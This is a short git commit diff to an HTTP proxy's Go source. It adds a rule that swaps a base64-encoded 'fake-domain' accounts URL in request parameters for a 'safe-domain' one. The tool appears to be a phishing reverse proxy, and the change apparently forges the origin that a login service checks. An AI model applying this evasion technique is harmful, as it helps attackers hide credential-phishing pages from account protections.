395af1aca4be761b26ef20e64f6590d968a8c009
loco141 <93374947+loco141@users.noreply.github.com>
2024-02-23 23:42:50 -0500

    Update http_proxy.go

--- core/http_proxy.go
+++ core/http_proxy.go
@@ -416,6 +416,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+							if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
+								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
+							}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
